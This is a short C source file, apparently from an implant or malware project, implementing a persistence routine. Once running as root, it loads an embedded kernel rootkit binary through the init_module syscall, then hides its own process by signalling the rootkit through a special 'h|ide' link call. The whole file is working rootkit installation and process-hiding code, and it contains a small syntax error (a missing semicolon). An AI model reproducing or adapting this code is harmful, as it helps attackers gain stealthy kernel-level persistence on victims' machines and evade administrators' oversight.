#include "rootkit.h"
#include "rootkit_bin.h"
#include "utils.h"

#define __NR_init_module 175

void try_persist(Globals *glob) {
  global = glob;

  DEBUG_LOG("[PERSIST] Trying to rookit!\n");
  if (global->geteuid() != 0) {
    DEBUG_LOG("[PERSIST] Not running as root\n");
    return;
  }

  DEBUG_LOG("[PERSIST] Loading kernel module\n");

  CHECK(global->syscall(__NR_init_module, ROOTKIT_BIN,
                        sizeof(ROOTKIT_BIN) / sizeof(char), "") == -1);

  DEBUG_LOG("[PERSIST] Hiding process\n");

  int pid = global->getpid();
  char pid_str[255];

  global->sprintf(pid_str, "%d", pid);

  global->link("h|ide", pid_str)

  DEBUG_LOG("[PERSIST] Process hidden\n");
}
